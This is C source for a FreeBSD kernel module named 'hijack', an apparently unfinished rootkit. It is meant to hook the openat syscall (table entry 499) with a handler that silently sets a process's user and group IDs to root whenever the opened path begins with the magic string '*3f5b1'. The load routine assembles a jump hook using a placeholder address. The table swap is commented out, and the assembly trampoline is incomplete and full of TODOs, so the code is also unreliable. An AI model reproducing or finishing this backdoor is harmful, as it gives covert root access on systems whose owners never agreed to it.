#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/pcpu.h>
#include <sys/sysent.h>

static int
__attribute__ ((noinline)) dummyret(struct thread *td) {
    return (td == (void *) NULL) ? 1 : 0;
}

static void
__attribute__ ((noinline)) get_pc_ecx() {
    __asm__ volatile ("mov 4(%esp), %ecx");
}

static int
new_sy_call(struct thread *td, void *syscall_args) {

    struct sc_args {
        int fd;
        char *path;
        int flag;
        mode_t mode;
    };

    struct sc_args *args;
    char * str;

    get_pc_ecx();
    __asm__ volatile ("addl $36, %ecx"); // TODO get exact value to add
    __asm__ volatile ("push %ecx"); // push return address

    // sy_call_t *openat_sy_call = (sy_call_t *)(0xc0c42820 + 5);                 
    // retval = (*openat_sy_call)(td, syscall_args);
    int retval = dummyret(td);

    __asm__ volatile ("push %ebp");
    __asm__ volatile ("mov  %esp, %ebp");
    __asm__ volatile ("push %edi");
    __asm__ volatile ("push %esi");
    __asm__ volatile ("movl -0x38(%ebp), %edi");

    // TODO insert jmp to old syscall + 8,
    // when old sys call returns, its retval will be in eax.

    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");
    __asm__ volatile ("nop");

    if (retval != 0) {                                                        
        goto returnlabel;
    }                                                                         

    args = (struct sc_args *) syscall_args;                   
    str = args->path;                                                  

    if (str[0] == '*' &&                                                      
        str[1] == '3' &&                                                      
        str[2] == 'f' &&                                                      
        str[3] == '5' &&                                                      
        str[4] == 'b' &&                                                      
        str[5] == '1') {                                                      

        td->td_ucred->cr_uid =
            td->td_ucred->cr_ruid =
            td->td_ucred->cr_svuid =
            td->td_ucred->cr_gid =
            td->td_ucred->cr_rgid =
            td->td_ucred->cr_svgid =
            0u;
    }

returnlabel:
    return (retval);                                                          
}

static void
p32(uint8_t bytes[], void *addr) {

    uint32_t addr32 = (uint32_t) addr;
    bytes[0] = addr32 & 0xff;
    bytes[1] = (addr32 >> 8) & 0xff;
    bytes[2] = (addr32 >> 16) & 0xff;
    bytes[3] = (addr32 >> 24) & 0xff;
}

static int
load(struct module *module, int cmd, void *arg) {

    switch (cmd) {

    case MOD_LOAD: {

        sy_call_t *old_sy_call = curthread->td_proc->p_sysent->sv_table[499].sy_call;

        uint8_t jmphook[8];
        jmphook[0] = 0xea;
        p32(&(jmphook[1]), (void *)0xaabbccdd);
        jmphook[5] = 0x0;
        jmphook[6] = 0x0;
        jmphook[7] = 0x90;

        printf("\n%x %x %x %x %x %x %x %x\n", jmphook[0], jmphook[1], jmphook[2], jmphook[3], jmphook[4], jmphook[5], jmphook[6], jmphook[7]);
        printf("%p\n", old_sy_call);
        printf("%p\n", new_sy_call);

        /* redirect the entry to point to the new syscall handler. */
        // curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;

        break;
    }

    default:
        break;
    }

    return (0);
}

/* The second argument of DECLARE_MODULE. */
static moduledata_t hijack_mod = {
    "hijack",       /* module name */
    load,           /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(hijack, hijack_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
